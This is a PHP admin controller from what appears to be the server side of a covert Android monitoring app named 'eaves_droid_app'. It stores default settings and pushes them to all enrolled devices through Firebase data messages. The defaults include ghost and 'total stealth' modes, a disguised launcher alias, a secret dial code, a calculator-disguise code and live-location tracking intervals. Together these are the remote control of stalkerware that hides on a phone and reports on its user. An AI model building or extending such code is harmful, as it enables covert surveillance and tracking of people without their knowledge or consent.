<?php

namespace App\Controllers\admin;

use App\Models\LogUserActionModel;
use CodeIgniter\API\ResponseTrait;

class DefaultsController extends BaseAdminController
{
    use ResponseTrait;
    public function index()
    {
        $db = $this->getDb();
        $this->ensureTableExists($db);

        $defaults = $db->table('tbl_system_default_apps')
            ->orderBy('version', 'DESC')
            ->limit(1)
            ->get()
            ->getRowArray();

        return $this->renderView('admin/defaults', [
            'pag' => 'admin-defaults',
            'defaults' => $defaults,
        ]);
    }

    private function ensureTableExists($db)
    {
        if (!$db->tableExists('tbl_system_default_apps')) {
            $db->query("CREATE TABLE IF NOT EXISTS tbl_system_default_apps (
                id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
                config_json JSON NOT NULL,
                version INT UNSIGNED NOT NULL DEFAULT 1,
                created_by INT UNSIGNED DEFAULT NULL,
                created_at DATETIME DEFAULT NULL,
                updated_at DATETIME DEFAULT NULL,
                FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL ON UPDATE CASCADE
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8");

            $defaults = json_encode([
                'pref_auto_sync_v2' => true,
                'pref_sync_interval_v2' => '6',
                'pref_disable_uploads' => false,
                'pref_disable_file_uploads' => false,
                'pref_ghost_mode' => false,
                'pref_total_stealth_mode' => false,
                'pref_stealth_mode' => 'com.niccher.eaves_droid_app.activities.Splash_Default',
                'pref_dial_code' => '*#007#',
                'pref_secret_code' => '1234',
                'pref_server_url' => '',
                'pref_live_location_interval' => '30',
                'pref_queue_sync_interval' => '15',
                'pref_deactivated' => false,
            ]);

            $db->table('tbl_system_default_apps')->insert([
                'config_json' => $defaults,
                'version' => 1,
                'created_at' => date('Y-m-d H:i:s'),
                'updated_at' => date('Y-m-d H:i:s'),
            ]);
        }
    }

    public function save()
    {
        if (!$this->request->isAJAX()) {
            return $this->fail('Invalid request');
        }

        $config = $this->request->getPost('config_json');
        if (!$config) {
            return $this->fail('Config data required.');
        }

        // Clamp values to prevent Android crashes
        if (is_string($config)) {
            $decoded = json_decode($config, true);
        } else {
            $decoded = $config;
        }
        if (is_array($decoded)) {
            // Sync interval: 1-24 hours, reset to 1 if out of range
            if (isset($decoded['pref_sync_interval_v2'])) {
                $val = (int)$decoded['pref_sync_interval_v2'];
                $decoded['pref_sync_interval_v2'] = ($val >= 1 && $val <= 24) ? (string)$val : '6';
            }
            // Live location interval: 1-1440 minutes, reset to 30 if out of range
            if (isset($decoded['pref_live_location_interval'])) {
                $val = (int)$decoded['pref_live_location_interval'];
                $decoded['pref_live_location_interval'] = ($val >= 1 && $val <= 1440) ? (string)$val : '30';
            }
            // Queue sync interval: 1-120 minutes, reset to 15 if out of range
            if (isset($decoded['pref_queue_sync_interval'])) {
                $val = (int)$decoded['pref_queue_sync_interval'];
                $decoded['pref_queue_sync_interval'] = ($val >= 1 && $val <= 120) ? (string)$val : '15';
            }
            // Dial code: must contain #, reset to default if empty
            if (isset($decoded['pref_dial_code']) && empty(trim($decoded['pref_dial_code']))) {
                $decoded['pref_dial_code'] = '*#007#';
            }
            // Calculator code: must be non-empty, reset to default if empty
            if (isset($decoded['pref_secret_code']) && empty(trim($decoded['pref_secret_code']))) {
                $decoded['pref_secret_code'] = '1234';
            }
            $config = json_encode($decoded);
        }

        try {
            $db = $this->getDb();
            $this->ensureTableExists($db);

            $lastVersion = (int) $db->table('tbl_system_default_apps')
                ->selectMax('version')
                ->get()
                ->getRowArray()['version'] ?? 0;

            $newVersion = $lastVersion + 1;

            $db->table('tbl_system_default_apps')->insert([
                'config_json' => is_string($config) ? $config : json_encode($config),
                'version' => $newVersion,
                'created_by' => $this->userId,
                'created_at' => date('Y-m-d H:i:s'),
                'updated_at' => date('Y-m-d H:i:s'),
            ]);

            $logModel = new \App\Models\LogUserActionModel();
            $logModel->logAction([
                'action_category' => 'admin',
                'action_type' => 'defaults_save',
                'action_severity' => 'medium',
                'success' => 1,
                'new_values' => json_encode(['version' => $newVersion]),
            ]);

            return $this->respond([
                'success' => true,
                'message' => "DefaultsController saved (v{$newVersion}).",
                'version' => $newVersion,
            ]);
        } catch (\Exception $e) {
            log_message('error', 'DefaultsController save error: ' . $e->getMessage());
            return $this->fail('Server error.');
        }
    }

    public function push()
    {
        if (!$this->request->isAJAX()) {
            return $this->fail('Invalid request');
        }

        try {
            $db = $this->getDb();
            $this->ensureTableExists($db);

            $defaults = $db->table('tbl_system_default_apps')
                ->orderBy('version', 'DESC')
                ->limit(1)
                ->get()
                ->getRowArray();

            if (!$defaults) {
                return $this->fail('No defaults saved yet.');
            }

            $devices = $db->table('tbl_device_profiles')
                ->select('fcm_token')
                ->where('fcm_token !=', '')
                ->where('fcm_token IS NOT NULL')
                ->get()
                ->getResultArray();

            if (empty($devices)) {
                return $this->fail('No devices with FCM tokens.');
            }

            $firebase = new \App\Libraries\FirebaseLib();
            $sent = 0;

            foreach ($devices as $d) {
                $result = $firebase->sendDataMessage($d['fcm_token'], [
                    'command' => 'cmd_update_prefs',
                    'payload' => 'defaults',
                    'prefs' => $defaults['config_json'],
                    'defaults_version' => (string) $defaults['version'],
                    'sent_at' => date('Y-m-d H:i:s'),
                ]);
                if ($result !== false) $sent++;
            }

            $logModel = new \App\Models\LogUserActionModel();
            $logModel->logAction([
                'action_category' => 'admin',
                'action_type' => 'defaults_push',
                'action_severity' => 'medium',
                'success' => 1,
                'new_values' => json_encode([
                    'version' => $defaults['version'],
                    'devices_sent' => $sent,
                    'total_devices' => count($devices),
                ]),
            ]);

            return $this->respond([
                'success' => true,
                'message' => "DefaultsController v{$defaults['version']} pushed to {$sent}/" . count($devices) . " devices.",
            ]);
        } catch (\Exception $e) {
            log_message('error', 'DefaultsController push error: ' . $e->getMessage());
            return $this->fail('Server error.');
        }
    }
}
